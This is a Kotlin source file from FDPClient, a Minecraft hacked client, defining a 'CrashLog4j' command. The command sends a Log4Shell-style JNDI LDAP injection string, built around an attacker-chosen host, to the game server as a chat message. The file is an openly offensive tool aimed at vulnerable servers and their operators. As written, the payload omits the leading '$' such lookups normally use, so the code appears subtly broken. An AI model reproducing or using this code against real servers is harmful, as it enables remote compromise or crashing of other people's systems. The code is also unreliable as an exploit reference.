/*
 * FDPClient Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge by LiquidBounce.
 * https://github.com/UnlegitMC/FDPClient/
 */
package net.ccbluex.liquidbounce.features.command.commands

import net.ccbluex.liquidbounce.LiquidBounce
import net.ccbluex.liquidbounce.features.command.Command
import net.minecraft.network.play.client.C01PacketChatMessage
import net.ccbluex.liquidbounce.utils.PacketUtils

class CrashLog4jCommand : Command("CrashLog4j", arrayOf("CrashLog4j")) {
    /**
     * Execute commands with provided [args]
     */
    override fun execute(args: Array<String>) {
        if (args.size > 1) {
            val crash = args[1]

            alert("sent "+args[1])
            PacketUtils.sendPacketNoEvent(C01PacketChatMessage("{jndi:ldap://"+args[1]+"}"))
            return
        }

        chatSyntax("CrashLog4j <string>")
    }
}
